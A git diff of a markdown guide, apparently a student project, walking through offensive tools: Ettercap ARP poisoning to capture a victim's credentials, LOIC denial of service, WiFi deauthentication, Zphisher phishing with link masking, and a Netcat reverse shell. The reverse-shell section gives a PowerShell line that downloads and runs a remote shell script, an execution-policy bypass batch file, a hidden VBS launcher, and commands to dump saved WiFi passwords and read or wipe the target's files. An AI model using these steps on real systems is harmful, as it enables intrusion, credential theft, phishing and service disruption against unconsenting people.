@@ -316,7 +316,7 @@ FinalRecon screenshot:
 ![image](https://user-images.githubusercontent.com/97077110/148497306-cc6cf98a-06a4-4e9f-a67b-7f6e8446dff2.png)  
 
 
-# StormBreaker  
+## StormBreaker  
 ![image](https://user-images.githubusercontent.com/97077110/148505490-62e933a2-4809-4a5f-b4b1-ced4ca922be7.png)  
 
 To install stormbreaker use command git clone https://github.com/ultrasecurity/Storm-Breaker.git  
@@ -475,19 +475,134 @@ Nmap can be used to scan local networks.There are many commands that we can use 
 
 Tcpdump is a packet analyzer that runs from the command line. TCP/IP and other packets that are transmitted through the network and seen by the system can be intercepted and displayed by using tcpdump. However the Raspberry Pi must be connected to the network to do so.  
 
-### Setup TcpDump:  
-```sudo apt-get install tcpdump```  
+### Installation of TcpDump:  
+use command ```sudo apt-get install tcpdump``` to install tcpdump  
 ![image](https://user-images.githubusercontent.com/97077110/148543181-aec55008-fa02-4a00-99b8-053e773aeed2.png)  
 
-```sudo tcpdump```  
+use command ```sudo tcpdump``` to collect tcp packets   
 ![image](https://user-images.githubusercontent.com/97077110/148543279-37c47c72-785d-4010-a36a-11d5365cd9f4.png)  
 
-```sudo tcp-dump -D```  : used to check available interfaces  
+use command ```sudo tcp-dump -D``` used to check available interfaces  
 ![image](https://user-images.githubusercontent.com/97077110/148543863-eee19f3f-1fa9-44b7-9e0d-f0f7fe3970f6.png)  
 
-```sudo tcpdump -i any -w fyp.pcap``` :capture all connection from any interface and write to fyp.pcap file
+use command ```sudo tcpdump -i any -w example.pcap``` capture all connection from any interface and write to fyp.pcap file
 ![image](https://user-images.githubusercontent.com/97077110/148544451-d9a9459d-647b-4c92-8179-1d521c9af03b.png)  
 
+use command ```tcpdump -r example.pcap``` to read the captured packet pcap file. 
+![image](https://user-images.githubusercontent.com/97077110/150912644-5d5f52e5-1d61-47cc-a74a-2a43a5f924e5.png)
+
+# Ettercap:  
+A tool that is used for man-in-the middle attacks which includes ARP spoofing, sniffing of live connections and is able to intercept and modify packets flowing through the network.  
+
+## Installation of Ettercap:  
+use command ``` Sudo apt-get install ettercap-common``` to install ettercap.  
+![image](https://user-images.githubusercontent.com/97077110/148885495-9d4eb8c0-0f77-47ab-8abc-784b032fea4e.png)  
+To run the Ettercap software use command ```ettercap -G```  
+![image](https://user-images.githubusercontent.com/97077110/148885707-d7a1853c-af4c-45f6-a7cf-f06db0399231.png)  
+This is the Ettercap gui interface:  
+![image](https://user-images.githubusercontent.com/97077110/148885937-a9e2ae37-4f94-4d80-87ff-36d6b442b29b.png)  
+Click on the lookup button to start unified sniffing  
+![image](https://user-images.githubusercontent.com/97077110/148886145-e489d4af-c084-4346-988f-17c079bfbc65.png)   
+Scan the host by clicking on the icon  
+![image](https://user-images.githubusercontent.com/97077110/148886171-abce0b61-9d5b-4a2c-b53e-99f8fe1a917a.png)   
+The available host will be shown  
+![image](https://user-images.githubusercontent.com/97077110/148886196-2dc8fb7b-02d3-4209-b881-f10b66b51cb4.png)   
+Select the ip address to attack and add to target 1.  
+To use ARP poisoning to intercept the communication between the devicesm click on circle sign and then arp poisoning:  
+![image](https://user-images.githubusercontent.com/97077110/148886264-98b75905-957b-4399-b656-8ffd6773309c.png)  
+After ticking the sniff remote connections, click ok and the arp poisoning sill start.  
+![image](https://user-images.githubusercontent.com/97077110/148886289-f5dce947-efda-446a-89c7-ca150cb26d71.png)  
+On the target side, this is how it looks like where they should enter the credentials:  
+![image](https://user-images.githubusercontent.com/97077110/150915184-45a9a060-6a48-412f-87fc-2fc2aac4c11e.png)  
+After victim enter the credentials, this is how it will look like after it is successfully intercepted.  
+![image](https://user-images.githubusercontent.com/97077110/150915470-e430dae4-075d-45cd-b5af-30b3ef6b05e4.png)  
+
+# Netcat Reverse shell connection:  
+
+On the Attacker side :  
+Open a listener for any incoming connection using command  
+```stty raw -echo; (stty size; cat) | nc -lvnp 3001```  
+![image](https://user-images.githubusercontent.com/97077110/150916396-4038a1cd-cf85-4154-891c-b926194a29d5.png)  
+After which on the client side to run powershell hidden, there are 3 files that we need to use.  
+![image](https://user-images.githubusercontent.com/97077110/150916525-7c904cbe-edf3-49a7-b15a-f62de4ba4299.png)  
+
+### Fyp.ps1:  
+This file contain the main payload that will be use to create reverse shell command   
+```IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell (Host IP) (listener port)```
+![image](https://user-images.githubusercontent.com/97077110/149295156-d2d06499-aedc-4c88-bd7b-d002f6f08635.png)
+
+### Fyp.bat:  
+Create a .bat file and use the command powershell.exe -ExecutionPolicy Bypass C:\fyp.ps1.   
+This file will point to the payload file .ps1  
+
+Command :```powershell.exe -ExecutionPolicy Bypass C:\fyp.ps1```  
+
+### Fyp.vbs:  
+This script is set to create a Wscript shell and point to the .bat file  
+
+Use command:  
+```
+Set WinScriptHost = CreateObject("WScript.Shell")  
+WinScriptHost.Run Chr(34) & "C:\fyp.bat" & Chr(34), 0  
+Set WinScriptHost = Nothing 
+```
+  
+Once these three files are downloaded and placed in the C: drive. We just have to run the .vbs file and a reverse shell connection will be created.  
+
+![image](https://user-images.githubusercontent.com/97077110/149295328-68fb39f5-d2cc-40b3-8ad5-5f9b5bfa7c22.png)  
+
+
+From reverse shell:  
+We can view the directory of the target computer/server using command ```dir```. 
+
+We can view the Users in the target computer/server ```Get-LocalUser ``` 
+![image](https://user-images.githubusercontent.com/97077110/149295392-5e7e8718-c681-4eba-8857-a29917067be9.png)   
+
+We can view the the Wifi interfaces that the target computer connected and get a clear view of the password using command
+```netsh wlan show profiles```  
+
+![image](https://user-images.githubusercontent.com/97077110/149295458-d8e2841a-3c49-4d4e-87a2-e10afbc0d876.png)  
+Use the command ```Netsh wlan show profile name=” (Wifi SSID)” key=clear``` to show the password of the WIFI.   
+![image](https://user-images.githubusercontent.com/97077110/149295654-529d5e72-5bce-4d26-8c3e-e694358f081d.png)
+We can view the running process on the target computer/server using command ```Get-process```  
+![image](https://user-images.githubusercontent.com/97077110/149295717-bddc35a0-6346-4b4b-99ca-461593367fd4.png)  
+
+use command ```Get-Content (file path )```to view the text file on the target computer/server:
+![image](https://user-images.githubusercontent.com/97077110/149295773-11b9d86b-ac2d-4580-b3cd-20f040db2460.png)
+
+We can clear the content of the file while retaining the item of itself using command ```Clear-Content (file path)```
+
+![image](https://user-images.githubusercontent.com/97077110/149295848-a8fac2ec-cc09-469b-b3ac-0e0be48e36e8.png)  
+
+# Low orbit ion cannon:  
+A tool that is used for stress testing and DOS attacks. 
+## Installation of Low orbit ion cannon 
+ 
+### Step 1: 
+Download LOIC software on google, use the Sourceforge link to download the software  
+![image](https://user-images.githubusercontent.com/97077110/148886414-3366e23f-1018-4874-8fdf-cbb5157e0050.png)  
+![image](https://user-images.githubusercontent.com/97077110/148886444-317ac4c7-fc1c-4d12-ac8a-a3c5571908f6.png)  
+### Step 2: 
+Save File into Downloads directory  
+![image](https://user-images.githubusercontent.com/97077110/148886476-2eb3ce0d-4b32-499d-b96c-54c5aa992b5e.png)  
+### Step 3: 
+Extract the file out  
+![image](https://user-images.githubusercontent.com/97077110/148886535-3881bfa4-0177-4fe8-adfe-8df23ee09331.png)  
+### Step 4: 
+Install the mono tool to help us use the executable software by using command ```sudo apt install mono-complete```  
+![image](https://user-images.githubusercontent.com/97077110/148886720-8a9ec717-f3aa-4821-b650-a7b498585457.png)  
+# LOIC  
+use command ```mono LOIC.exe```  to use the LOIC tool 
+![image](https://user-images.githubusercontent.com/97077110/148887634-1d4f253e-4a37-4d08-a605-501d33ba6cbe.png)  
+![image](https://user-images.githubusercontent.com/97077110/148887661-5ac9ba8c-eca3-4689-839a-4c98fa2afe0a.png)    
+
+This is the main page of the LOIC:   
+
+![image](https://user-images.githubusercontent.com/97077110/150096957-d8e4dcfc-f0ff-4a75-8991-74aeacfe3e6d.png)
+
+
+Use wireshark to see the packets to show that the DOS attack is successful:  
+![image](https://user-images.githubusercontent.com/97077110/150097039-1c9b4eb3-ad4f-4409-9813-b23eea55c464.png)
 
 ## Proxychain tor:  
 Proxychains is a UNIX application that allows us to mask our legitimate IP address by redirecting network traffic. It routes our TCP traffic through a variety of proxies, including TOR, SOCKS4, SOCKS5, and HTTP (S). Proxychain can be used alongside with tools and application such as nmap to mask the true ip address of our host machine.    
@@ -565,51 +680,24 @@ Options set SOURCE facebook.com
 ![image](https://user-images.githubusercontent.com/97077110/148885096-caaee32b-600d-48ac-828c-b1a99ebc63c1.png)  
 ![image](https://user-images.githubusercontent.com/97077110/148885136-d54b030d-119e-4bde-a550-d7b384bd3b70.png)  
 ![image](https://user-images.githubusercontent.com/97077110/148885166-f72a1697-3ef5-4691-bafe-1336dbcd0d88.png)  
-# Ettercap:  
-## Installation of Ettercap:  
-``` Sudo apt-get install ettercap-common```  
-![image](https://user-images.githubusercontent.com/97077110/148885495-9d4eb8c0-0f77-47ab-8abc-784b032fea4e.png)  
-Running Ethecap software use command ```ettercap -G```  
-![image](https://user-images.githubusercontent.com/97077110/148885707-d7a1853c-af4c-45f6-a7cf-f06db0399231.png)  
-This is the Ettercap gui interface:  
-![image](https://user-images.githubusercontent.com/97077110/148885937-a9e2ae37-4f94-4d80-87ff-36d6b442b29b.png)  
-Click on the lookup button to start unified sniffing  
-![image](https://user-images.githubusercontent.com/97077110/148886145-e489d4af-c084-4346-988f-17c079bfbc65.png)  
-Scan the host by clicking on the icon  
-![image](https://user-images.githubusercontent.com/97077110/148886171-abce0b61-9d5b-4a2c-b53e-99f8fe1a917a.png)  
-![image](https://user-images.githubusercontent.com/97077110/148886196-2dc8fb7b-02d3-4209-b881-f10b66b51cb4.png)  
-![image](https://user-images.githubusercontent.com/97077110/148886215-7423f2eb-aedc-4782-b3ec-ab25124f29a2.png)  
-![image](https://user-images.githubusercontent.com/97077110/148886240-3617d338-2a94-4bca-8376-14a3d1cb702e.png)  
-![image](https://user-images.githubusercontent.com/97077110/148886264-98b75905-957b-4399-b656-8ffd6773309c.png)  
-![image](https://user-images.githubusercontent.com/97077110/148886289-f5dce947-efda-446a-89c7-ca150cb26d71.png)  
+
 # Red Python Wifi Ddos attack:  
-# Low orbit ion cannon:  
-## Installation of Low orbit ion cannon 
-### Step 1: 
-Download LOIC software on google, use the Sourceforge link to download the software  
-![image](https://user-images.githubusercontent.com/97077110/148886414-3366e23f-1018-4874-8fdf-cbb5157e0050.png)  
-![image](https://user-images.githubusercontent.com/97077110/148886444-317ac4c7-fc1c-4d12-ac8a-a3c5571908f6.png)  
-### Step 2: 
-Save File into Downloads directory  
-![image](https://user-images.githubusercontent.com/97077110/148886476-2eb3ce0d-4b32-499d-b96c-54c5aa992b5e.png)  
-### Step 3: 
-Extract the file out  
-![image](https://user-images.githubusercontent.com/97077110/148886535-3881bfa4-0177-4fe8-adfe-8df23ee09331.png)  
-### Step 4: 
-Install the mono tool to help us use the executable software by using command ```sudo apt install mono-complete```  
-![image](https://user-images.githubusercontent.com/97077110/148886720-8a9ec717-f3aa-4821-b650-a7b498585457.png)  
-# LOIC  
-use command ```mono LOIC.exe```  
-![image](https://user-images.githubusercontent.com/97077110/148887634-1d4f253e-4a37-4d08-a605-501d33ba6cbe.png)  
-![image](https://user-images.githubusercontent.com/97077110/148887661-5ac9ba8c-eca3-4689-839a-4c98fa2afe0a.png)    
-
-This is the main page of the LOIC:   
-
-![image](https://user-images.githubusercontent.com/97077110/150096957-d8e4dcfc-f0ff-4a75-8991-74aeacfe3e6d.png)
+## Installation of Red Python WIFI Dos:  
+Use command ```git clone https://github.com /davidbombal/red-python-scripts.git```  
+![image](https://user-images.githubusercontent.com/97077110/150920154-822e07b8-efa6-4124-a9e8-b08abc2af1fc.png)  
+The tool will automatically search for any wireless access point around the area.  
+![image](https://user-images.githubusercontent.com/97077110/150920199-987891b5-ee09-4de8-b12e-d780d5324c66.png)  
+Choose the Wireless access point that you want to attack. Deauthentication frame will be sent to the target and the target’s connection with the Wi-Fi network will be terminated.  
+This attack will also make the Wi-Fi slow and unstable. 
+![image](https://user-images.githubusercontent.com/97077110/150920677-444f3d67-4a3e-44b5-96f2-52dd6552d9ad.png)
 
 
-Use wireshark to see the packets to show that the DOS attack is successful:  
-![image](https://user-images.githubusercontent.com/97077110/150097039-1c9b4eb3-ad4f-4409-9813-b23eea55c464.png)
+
+
+
+
+
+
 
 
 
@@ -766,91 +854,26 @@ Attacker side:
 A reverse shell is created.
 ![image](https://user-images.githubusercontent.com/97077110/149291285-4d924a83-94fd-4a0d-85bd-a107ea62867a.png)
 
-
-
-## Netcat Reverse shell connection:  
-
-In the Attacker side :
-Need to open a listener for any incoming connection  
-```stty raw -echo; (stty size; cat) | nc -lvnp 3001```  
-
-Afterwards on the client side to run powershell hidden, there is 3 files that we need to use.  
-
-### Fyp.ps1:  
-This file contain the main payload that will be use to create reverse shell  
-Command:  
-```IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell (Host IP) (listener port)```
-
-![image](https://user-images.githubusercontent.com/97077110/149295156-d2d06499-aedc-4c88-bd7b-d002f6f08635.png)
-
-### Fyp.bat:  
-
-Create a .bat file and insert this code.  
-This file will point to the payload file .ps1  
-
-Command :```powershell.exe -ExecutionPolicy Bypass C:\fyp.ps1```  
-
-### Fyp.vbs:  
-This script is set to create a Wscript shell and point to the .bat file  
-
-Command:  
-Set WinScriptHost = CreateObject("WScript.Shell")  
-WinScriptHost.Run Chr(34) & "C:\fyp.bat" & Chr(34), 0  
-Set WinScriptHost = Nothing  
-  
-Once these three files are downloaded and placed in the C: drive. We just have to run the .vbs file and a reverse shell connection will be created.  
-
-![image](https://user-images.githubusercontent.com/97077110/149295328-68fb39f5-d2cc-40b3-8ad5-5f9b5bfa7c22.png)
-
-
-We can view the directory of the target computer/server:
-dir  
-
-We can view the Users in the target computer/server:
-```Get-LocalUser ``` 
-![image](https://user-images.githubusercontent.com/97077110/149295392-5e7e8718-c681-4eba-8857-a29917067be9.png)  
-
-We can view the the Wifi interfaces that the target computer connected and get a clear view of the password:
-
-```netsh wlan show profiles```
-
-![image](https://user-images.githubusercontent.com/97077110/149295458-d8e2841a-3c49-4d4e-87a2-e10afbc0d876.png)  
-```Netsh wlan show profile name=” (Wifi SSID)” key=clear```  
-![image](https://user-images.githubusercontent.com/97077110/149295654-529d5e72-5bce-4d26-8c3e-e694358f081d.png)
-We can view the running process on the target computer/server:
-```Get-process```  
-![image](https://user-images.githubusercontent.com/97077110/149295717-bddc35a0-6346-4b4b-99ca-461593367fd4.png)  
-
-We can view the text file on the target computer/server:
-```Get-Content (file path )```
-
-![image](https://user-images.githubusercontent.com/97077110/149295773-11b9d86b-ac2d-4580-b3cd-20f040db2460.png)
-
-We can clear the content of the file while retaining the item of itself:
-```Clear-Content (file path)```
-
-![image](https://user-images.githubusercontent.com/97077110/149295848-a8fac2ec-cc09-469b-b3ac-0e0be48e36e8.png)
-
-
 ## Zphiser:
 A phising tool that consists of websites template that we can use to phish crendential from target.   
-Installation:  
-git clone https://github.com/hr-tech/zphiser
-
+## Installation of Zphisher:  
+use command ```git clone https://github.com/hr-tech/zphiser```  
 ![image](https://user-images.githubusercontent.com/97077110/149759958-e2110b7c-6646-47ba-ad62-681a9786d4c0.png)   
-
-```cd zphiser```   
-```chmod +x zphiser.sh```  
+To give permission to the file for it to be a executable use command ```chmod +x zphiser.sh```  
 ```bash zphiser.sh```  
 ![image](https://user-images.githubusercontent.com/97077110/149761036-c9d862fc-5472-41c9-b300-e3ccaed819bc.png)  
+This is the menu for Zphisher. 
 ![image](https://user-images.githubusercontent.com/97077110/149761086-b728070c-c39b-4052-915c-26e3e17dfef5.png)  
 
-Select Cloudflared option
-![image](https://user-images.githubusercontent.com/97077110/149761568-45bdc0bd-f568-4401-b488-425209246866.png)
+Select Cloudflared option  
+![image](https://user-images.githubusercontent.com/97077110/149761568-45bdc0bd-f568-4401-b488-425209246866.png)  
 
-Send the link to target:
-Together with maskphish , the link can be less suspicious to the target.
+Send the link to target:  
+ziphisher can be ued together with maskphish to make the link less suspicious to the target.
 ![image](https://user-images.githubusercontent.com/97077110/149761699-92aebd29-96ce-421a-ba20-d413425474fe.png)
+On the Target side:  
+![image](https://user-images.githubusercontent.com/97077110/150919838-3e49f6ff-e43c-45d1-b4bd-922aba1f1765.png)
+
 
 
 
